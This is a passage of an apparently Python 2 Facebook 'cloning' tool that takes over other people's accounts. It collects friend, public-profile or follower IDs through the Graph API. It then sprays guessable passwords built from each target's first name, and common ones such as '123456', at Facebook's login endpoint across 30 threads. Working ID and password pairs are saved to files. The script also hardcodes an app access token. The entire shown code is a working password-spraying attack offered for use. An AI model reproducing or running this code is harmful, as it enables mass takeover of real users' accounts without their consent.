	os.system("xdg-open https://facebook.com/groups/505521257441736/")
	time.sleep(2)
	okayabm()
	
def login_menu():
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except(KeyError , IOError):
		os.system("clear")
		print(logo)
                print("\033[1;97m-------------------------------------------------")
		print("\033[1;97m[1] Login With Facebook Token")
		print("\033[1;97m[2] Login With Facebook Password")
		print("\033[1;97m[3] Tool Back To Main Menu")
		print("\033[1;97m-------------------------------------------------")
		login()
def login():
	abm_login = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
	if abm_login =="1":
		      token_login()
	elif abm_login =="2":
		      fb_pass()
	elif abm_login =="3":
		      okayabm()
	else:
		      print("")
		      time.sleep(2)
		      print("\x1b[1;31mplease select a valid option").center(50)
		      print("")
		      time.sleep(2)
		      login_menu()
	
def token_login():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        print(logo)
        print("\033[1;97m-------------------------------------------------")
        token = raw_input("\033[1;97m[!] Token ➤ \033[0;92m")
        print("\033[1;97m-------------------------------------------------")
        sav_token = open("access_token.txt", "w")
        sav_token.write(token)
        sav_token.close()
        print("")
        time.sleep(2)
        print("\033[1;92mYour Token Has Successfull"). center(50)
        print("")
        time.sleep(2)
        menu()

def fb_pass():
	os.system("clear")
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except (KeyError , IOError):
		print(logo)
                print("\033[1;97m-------------------------------------------------")
		uid = raw_input("\033[1;97m[!] Email Number / Username ➤ \033[1;92m")
		passw = raw_input("\033[1;97m[!] Password ➤ \033[1;92m")
                print("\033[1;97m-------------------------------------------------")
		data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true", headers=header).text
		q = json.loads(data)
		if "access_token" in q:
			sav_fb = open("access_token.txt", "w")
			sav_fb.write(q["access_token"])
			sav_fb.close()
			time.sleep(2)
			print("\033[1;92mYour Account Login Successfull").center(50)
			time.sleep(2)
			menu()
		elif "www.facebook.com" in q["error"]:
			print("")
			time.sleep(2)
			print("\033[1;91mOpps, Your login account has checkpoint").center(50)
			print("")
			time.sleep(2)
			fb_pass()
		else:
			print("")
			time.sleep(2)
			print("\033[1;91mEmail/password/username has been wrong").center(50)
			print("")
			time.sleep(2)
	
def menu():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
    except(KeyError , IOError):
        update()
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        print(logo)
        print("")
        print("\033[1;91mOpps, Your Token Has CheckPoint"). center(50)
        os.system("rm -rf access_token.txt")
        print("")
        time.sleep(2)
        update()
    os.system("clear")
    print(logo)
    print("\033[1;97m\tLogged User ID : \x1b[1;32m"+name)
    print("\033[1;97m-------------------------------------------------")
    print("\033[1;97m[1] Facebook Cloning Menu")
    print("\033[1;97m[2] Facebook Cloning With Password")
    print("\033[1;97m[3] View Your Login Token")
    print("\033[1;97m[4] Select User Agents")
    print("\033[1;97m[5] Fix Username Error")
    print("\033[1;97m[6] Result Crack")
    print("\033[1;97m[7] Remove Token For Logout")
    print("\033[1;97m-------------------------------------------------")
    menu_login()
def menu_login():
	user_select = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
	if user_select =="1":
		crack()
	elif user_select =="2":
		choice_main()
	elif user_select =="3":
		view()
	elif user_select =='4':
		user_agents()
	elif user_select =='5':
		os.system("xdg-open https://findmyfbid.in/#:~:text=Your%20Facebook%20personal%20profile%20URL,profile.php%3Fid%3D100001533612613")
		time.sleep(2)
		menu()
	elif user_select =='6':
		result()
	elif user_select =='7':
		print("")
		print("")
		time.sleep(1)
		print("\033[1;92mToken logout successfull").center(50)
		print("")
		print("")
		time.sleep(1)
		os.system("rm -rf access_token.txt")
	else:
		print("")
		time.sleep(2)
		print("\033[1;91mSelect valid option").center(50)
		print("")
		time.sleep(2)
		menu_login()
		
def crack():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\x1b[1;31mToken not found or has checkpoint ").center(50)
		time.sleep(2)
		update()
	os.system("clear")
	print(logo)
        print("\033[1;97m-------------------------------------------------")
	print("\033[1;97m[1] Cloning From Friendlist ID") 
	print("\033[1;97m[2] Cloning With Public ID")
	print("\033[1;97m[3] Cloning With Follower ID")
	print("\033[1;97m[4] Back To Main Menu")
	print("\033[1;97m-------------------------------------------------")
	crack2()
def crack2():
	select = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		idt = raw_input("\033[1;97m[!] Enter Public ID/Username ➤ \x1b[1;32m")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
                        print("\033[1;97m-------------------------------------------------")
			print("[!] Cloning User Name :\033[1;92m "+q["name"])
		except KeyError:
			print("\033[1;91mInvalid link/Username OR Has Privacy").center(50)
			print("")
			time.sleep(2)
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="3":
		os.system("clear")
		print(logo)
		idt = raw_input("\033[1;97m[!] Enter Follower ID/Username ➤ \x1b[1;32m")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
                        print("\033[1;97m-------------------------------------------------")
			print("[!] Cloning User Name : \033[1;92m"+q["name"])
		except KeyError:
			print("\033[1;91mInvalid link/Username OR Has Privacy").center(50)
			print("")
			time.sleep(2)
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="4":
	    menu()
	else:
		print("")
		time.sleep(2)
		print("\033[1;91mSelect valid option").center(50)
		print("")
		time.sleep(2)
		crack()
        print("\033[1;97m-------------------------------------------------")
	print("\033[1;97m[!] Total User IDs : \x1b[1;32m"+str(len(id)))
	print("\033[1;97m[!] Cracking Started....")
	print("\033[1;97m[!] Plz Wait Clone Account Will Be Appear Here")
	print("\033[1;97m-------------------------------------------------")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		biran = random.choice(birth)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
                   pass1 = name.lower() + '@123'
                   data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                   q = json.loads(data)
                   if 'access_token' in q:
                       print ' \x1b[1;32m [RISHU-OK] ' + uid + ' ➤ ' + pass1 + '\x1b[0;97m'
                       ok = open('Asghar.txt', 'a')
                       ok.write(uid + '|' + pass1 + '\n')
                       ok.close()
                       oks.append(uid + pass1)
                   elif 'www.facebook.com' in q['error_msg']:
                       print ' \x1b[1;31m [RISHU-CP] ' + uid + ' ➤ ' + pass1 + '\x1b[0;97m'
                       cp = open('Asghar.txt', 'a')
                       cp.write(uid + '|' + pass1 + '\n')
                       cp.close()
                       cps.append(uid + pass1)
                   else:
                       pass2 = name.lower() + '123'
                       data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                       q = json.loads(data)
                       if 'access_token' in q:
                           print ' \x1b[1;32m [RISHU-OK] ' + uid + ' ➤ ' + pass2 + '\x1b[0;97m'
                           ok = open('Abdullahok.txt', 'a')
                           ok.write(uid + '|' + pass2 + '\n')
                           ok.close()
                           oks.append(uid + pass2)
                       elif 'www.facebook.com' in q['error_msg']:
                           print ' \x1b[1;31m [RISHU-CP] ' + uid + ' ➤ ' + pass2 + '\x1b[0;97m'
                           cp = open('Abdullahcp.txt', 'a')
                           cp.write(uid + '|' + pass2 + '\n')
                           cp.close()
                           cps.append(uid + pass2)
                       else:
                           pass3 = name.lower() + '1234'
                           data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                           q = json.loads(data)
                           if 'access_token' in q:
                               print ' \x1b[1;32m [RISHU-OK] ' + uid + ' ➤ ' + pass3 + '\x1b[0;97m'
                               ok = open('Abdullahok.txt', 'a')
                               ok.write(uid + '|' + pass3 + '\n')
                               ok.close()
                               oks.append(uid + pass3)
                           elif 'www.facebook.com' in q['error_msg']:
                               print ' \x1b[1;31m [RISHU-CP] ' + uid + ' ➤ ' + pass3 + '\x1b[0;97m'
                               cp = open('Abdullahcp.txt', 'a')
                               cp.write(uid + '|' + pass3 + '\n')
                               cp.close()
                               cps.append(uid + pass3)
                           else:
                               pass4 = name.lower() + '12345'
                               data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                               q = json.loads(data)
                               if 'access_token' in q:
                                   print ' \x1b[1;32m [RISHU-OK] ' + uid + ' ➤ ' + pass4 + '\x1b[0;97m'
                                   ok = open('Abdullahok.txt', 'a')
                                   ok.write(uid + '|' + pass4 + '\n')
                                   ok.close()
                                   oks.append(uid + pass4)
                               elif 'www.facebook.com' in q['error_msg']:
                                   print ' \x1b[1;31m [RISHU-CP] ' + uid + ' ➤ ' + pass4 + '\x1b[0;97m'
                                   cp = open('Abdullahcp.txt', 'a')
                                   cp.write(uid + '|' + pass4 + '\n')
                                   cp.close()
                                   cps.append(uid + pass4)
                               else:
                                   pass5 = name.lower() + '123456'
                                   data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                   q = json.loads(data)
                                   if 'access_token' in q:
                                       print ' \x1b[1;32m [RISHU-OK] ' + uid + ' ➤ ' + pass5 + '\x1b[0;97m'
                                       ok = open('Abdullahok.txt', 'a')
                                       ok.write(uid + '|' + pass5 + '\n')
                                       ok.close()
                                       oks.append(uid + pass5)
                                   elif 'www.facebook.com' in q['error_msg']:
                                       print ' \x1b[1;31m [RISHU-CP] ' + uid + ' ➤ ' + pass5 + '\x1b[0;97m'
                                       cp = open('Abdullahcp.txt', 'a')
                                       cp.write(uid + '|' + pass5 + '\n')
                                       cp.close()
                                       cps.append(uid + pass5)
                                   else:
                                       pass6 = name.lower() + '786'
                                       data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                       q = json.loads(data)
                                       if 'access_token' in q:
                                           print ' \x1b[1;32m [RISHU-OK] ' + uid + ' ➤ ' + pass6 + '\x1b[0;97m'
                                           ok = open('Abdullahok.txt', 'a')
                                           ok.write(uid + '|' + pass6 + '\n')
                                           ok.close()
                                           oks.append(uid + pass6)
                                       elif 'www.facebook.com' in q['error_msg']:
                                           print ' \x1b[1;31m [RISHU-CP] ' + uid + ' ➤ ' + pass6 + '\x1b[0;97m'
                                           cp = open('Abdullahcp.txt', 'a')
                                           cp.write(uid + '|' + pass6 + '\n')
                                           cp.close()
                                           cps.append(uid + pass6)
                                       else:
                                           pass7 = name.lower() + '1122'
                                           data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass7 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                           q = json.loads(data)
                                           if 'access_token' in q:
                                               print ' \x1b[1;32m [RISHU-OK] ' + uid + ' ➤ ' + pass7 + '\x1b[0;97m'
                                               ok = open('Abdullahok.txt', 'a')
                                               ok.write(uid + '|' + pass7 + '\n')
                                               ok.close()
                                               oks.append(uid + pass7)
                                           elif 'www.facebook.com' in q['error_msg']:
                                               print ' \x1b[1;31m [RISHU-CP] ' + uid + ' ➤ ' + pass7 + '\x1b[0;97m'
                                               cp = open('Abdullahcp.txt', 'a')
                                               cp.write(uid + '|' + pass7 + '\n')
                                               cp.close()
                                               cps.append(uid + pass7)
                                           else:
                                               pass8 = '786786'
                                               data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass8 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                               q = json.loads(data)
                                               if 'access_token' in q:
                                                   print ' \x1b[1;32m [RISHU-OK] ' + uid + ' ➤ ' + pass8 + '\x1b[0;97m'
                                                   ok = open('Abdullahok.txt', 'a')
                                                   ok.write(uid + '|' + pass8 + '\n')
                                                   ok.close()
                                                   oks.append(uid + pass8)
                                               elif 'www.facebook.com' in q['error_msg']:
                                                   print ' \x1b[1;31m [RISHU-CP] ' + uid + ' ➤ ' + pass8 + '\x1b[0;97m'
                                                   cp = open('Abdullahcp.txt', 'a')
                                                   cp.write(uid + '|' + pass8 + '\n')
                                                   cp.close()
                                                   cps.append(uid + pass8)
                                               else:
                                                   pass9 = '123456'
                                                   data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass9 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                                   q = json.loads(data)
                                                   if 'access_token' in q:
                                                       print ' \x1b[1;32m [RISHU-OK] ' + uid + ' ➤ ' + pass9 + '\x1b[0;97m'
                                                       ok = open('Abdullahok.txt', 'a')
                                                       ok.write(uid + '|' + pass9 + '\n')
                                                       ok.close()
                                                       oks.append(uid + pass9)
                                                   elif 'www.facebook.com' in q['error_msg']:
                                                       print '\x1b[1;31m [RISHU-CP] ' + uid + ' ➤ ' + pass9 + '\x1b[0;97m'
                                                       cp = open('Abdullahcp.txt', 'a')
                                                       cp.write(uid + '|' + pass9 + '\n')
                                                       cp.close()
                                                       cps.append(uid + pass9)
                                                   else:
                                                       pass10 = '123456789'
                                                       data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass10 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                                       q = json.loads(data)
                                                       if 'access_token' in q:
                                                           print ' \x1b[1;32m [RISHU-OK] ' + uid + ' ➤ ' + pass10 + '\x1b[0;97m'
                                                           ok = open('Abdullahok.txt', 'a')
                                                           ok.write(uid + '|' + pass10 + '\n')
                                                           ok.close()
                                                           oks.append(uid + pass10)
                                                       elif 'www.facebook.com' in q['error_msg']:
                                                           print ' \x1b[1;31m [RISHU-CP] ' + uid + ' ➤ ' + pass10 + '\x1b[0;97m'
                                                           cp = open('Abdullahcp.txt', 'a')
                                                           cp.write(uid + '|' + pass10 + '\n')
                                                           cp.close()
                                                           cps.append(uid + pass10)														
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
        print("\033[1;97m-------------------------------------------------")
	print("\033[1;97m[!] The cloning process has been completed")
	print("\033[1;97m[!] Total \x1b[1;31mCP\x1b[1;37m/\x1b[1;32mOK\x1b[1;37m: "+str(len(cps))+"/"+str(len(oks)))
	print("\033[1;97m[!] CP file saved as : \x1b[1;31mcps.txt")
	print("\033[1;97m[!] OK file saved as : \x1b[1;32moks.txt")
        print("\033[1;97m-------------------------------------------------")
	raw_input("\033[1;97m[!] Press Enter To Main Menu Back")
	menu()
	
def choice_main():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\033[1;91mToken not found or has checkpoint ").center(50)
		time.sleep(2)
		update()
	os.system("clear")
	print(logo)
	print("\033[1;92mWelcome To Choose Password Forum").center(50)
	print("")
	time.sleep(2)
        print("\033[1;97m-------------------------------------------------")
	print("\033[1;97m[1\033[1;97m] Cloning From Numbring Password")
	print("\033[1;97m[2\033[1;97m] Cloning From String Password")
	print("\033[1;97m[3\033[1;97m] Back")
	print("\033[1;97m-------------------------------------------------")
	choice_main2()
def choice_main2():
	main_put = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
	if main_put =="1":
		choice()
	elif main_put =="2":
		string()
	elif main_put =="2":
		menu()
	else:
		print("")
		print("\x1b[1;31mPlease select a valid option").center(50)
		print("")
		time.sleep(3)
		choice_main()
	
def choice():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("Token not found or has checkpoint ").center(50)
		time.sleep(2)
		update()
	os.system("clear")
	print(logo)
        print("\033[1;97m-------------------------------------------------")
	print("\033[1;97m[1] Cloning With Public ID")
	print("\033[1;97m[2] Cloning With Follower ID")
	print("\033[1;97m[3] Back To Main Menu")
	print("\033[1;97m-------------------------------------------------")
	choice2()
def choice2():
	select = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		idt = raw_input("\033[1;97m[!] Enter Public ID/Username ➤ \x1b[1;32m")
		print("")
                print("\033[1;97m-------------------------------------------------")
		print("[!] Password : 768786,000786,123456").center(50)
                print("\033[1;97m-------------------------------------------------")
		print("")
                print("\033[1;97m-------------------------------------------------")
		pass1 = raw_input("[1] Password : ")
		pass2 = raw_input("[2] Password : ")
		pass3 = raw_input("[3] Password : ")
                print("\033[1;97m-------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
                        print("\033[1;97m-------------------------------------------------")
			print("[!] Cloning User Name :\033[1;92m "+q["name"])
		except KeyError:
			print("\033[1;91mInvalid link/Username OR Has Privacy").center(50)
			print("")
			time.sleep(2)
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
                print("\033[1;97m-------------------------------------------------")
		idt = raw_input("\033[1;97m[!] Enter Follower ID/Username ➤ \x1b[1;32m")
                print("\033[1;97m-------------------------------------------------")
		print("")
                print("\033[1;97m-------------------------------------------------")
		print("[!] Password : 768786,000786,123456").center(50)
                print("\033[1;97m-------------------------------------------------")
		print("")
                print("\033[1;97m-------------------------------------------------")
		pass1 = raw_input("[1] Password : ")
		pass2 = raw_input("[2] Password : ")
		pass3 = raw_input("[3] Password : ")
                print("\033[1;97m-------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
                        print("\033[1;97m-------------------------------------------------")
			print("[!] Cloning User Name : \033[1;92m"+q["name"])
		except KeyError:
			print("\033[1;91mInvalid link/Username OR Has Privacy").center(50)
			print("")
			time.sleep(2)
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="3":
	    menu()
	else:
		print("")
		time.sleep(2)
		print("\033[1;91mSelect valid option").center(50)
		print("")
		time.sleep(2)
		choice()
        print("\033[1;97m-------------------------------------------------")
	print("\033[1;97m[!] Total User IDs : \x1b[1;32m"+str(len(id)))
	print("\033[1;97m[!] Cracking Started....")
	print("\033[1;97m[!] Plz Wait Clone Account Will Be Appear Here")
	print("\033[1;97m-------------------------------------------------")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		biran = random.choice(birth)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print("\033[1;92m[RISHU-OK] "+uid+" - "+pass1+" - "+name+"\033[0;97m") 
				ok = open("/sdcard/oks.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print("\033[1;91m[RISHU-CP] "+uid+" - "+pass1+" - "+name+"\033[0;97m" )
					cp = open("/sdcars/cps.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:

					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
                                                print("\033[1;92m[RISHU-OK] "+uid+" - "+pass2+" - "+name+"\033[0;97m") 
				                ok = open("/sdcard/oks.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print("\033[1;91m[RISHU-CP] "+uid+" - "+pass2+" - "+name+"\033[0;97m" )
					                cp = open("/sdcard/cps.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
		
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print("\033[1;92m[RISHU-OK] "+uid+" - "+pass3+" - "+name+"\033[0;97m") 
				                                ok = open("/sdcard/oks.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print("\033[1;91m[RISHU-CP] "+uid+" - "+pass3+" - "+name+"\033[0;97m" )
					                                cp = open("/sdcard/cps.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
																
																
																
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m-------------------------------------------------")
	print("\033[1;97m[!] The cloning process has been completed")
	print("\033[1;97m[!] Total \x1b[1;31mCP\x1b[1;37m/\x1b[1;32mOK\x1b[1;37m: "+str(len(cps))+"/"+str(len(oks)))
	print("\033[1;97m[!] CP file saved as : \x1b[1;31mcps.txt")
	print("\033[1;97m[!] OK file saved as : \x1b[1;32moks.txt")
        print("\033[1;97m-------------------------------------------------")
	raw_input("\033[1;97m[!] Press enter to back")
	menu()	
	
def string():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\x1b[1;31mToken not found or has checkpoint ").center(50)
		time.sleep(2)
		update()
	os.system("clear")
	print(logo)
        print("\033[1;97m-------------------------------------------------")
	print("\033[1;97m[1] Cloning With Public ID")
	print("\033[1;97m[2] Cloning With Follower ID")
	print("\033[1;97m[3] Back To Main Menu")
	print("\033[1;97m-------------------------------------------------")
	string2()
def string2():
	select = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
                print("\033[1;97m-------------------------------------------------")
		idt = raw_input("\033[1;97m[!] Enter Public ID/Username ➤ \x1b[1;32m")
                print("\033[1;97m-------------------------------------------------")
		print("")
                print("\033[1;97m-------------------------------------------------")
		print("\x1b[1;32m[!] Password : 123,1234,786").center(50)
                print("\033[1;97m-------------------------------------------------")
		print("")
                print("\033[1;97m-------------------------------------------------")
		p1 = raw_input("[1] Password : ")
		p2 = raw_input("[2] Password : ")
		p3 = raw_input("[3] Password : ")
                print("\033[1;97m-------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
                        print("\033[1;97m-------------------------------------------------")
			print("[!] Cloning User Name :\033[1;92m "+q["name"])
		except KeyError:
			print("\033[1;91mInvalid link/Username OR Has Privacy").center(50)
			print("")
			time.sleep(2)
			string()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
